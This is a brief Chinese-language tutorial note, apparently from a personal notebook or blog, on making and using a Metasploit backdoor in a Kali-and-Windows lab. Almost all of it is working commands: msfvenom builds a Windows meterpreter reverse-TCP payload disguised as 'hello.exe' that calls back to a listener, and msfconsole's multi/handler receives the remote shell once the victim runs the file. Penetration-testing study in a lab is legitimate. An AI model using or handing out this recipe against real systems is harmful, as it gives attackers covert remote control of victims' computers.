# metasploit---后门使用

keywords: metasploit msf msfvenom 反向连接  

准备kali和windows  

kali生成恶意文件：  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.141 LPORT=8080 -a x86 -f exe -o hello.exe
```

kali监听：  
```bash
msfconsole
# 启动后执行以下命令
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 0.0.0.0
    set LPORT 8080
    exploit
```

windows执行hello.exe之后，kali即可获取shell  


2021/4/20  
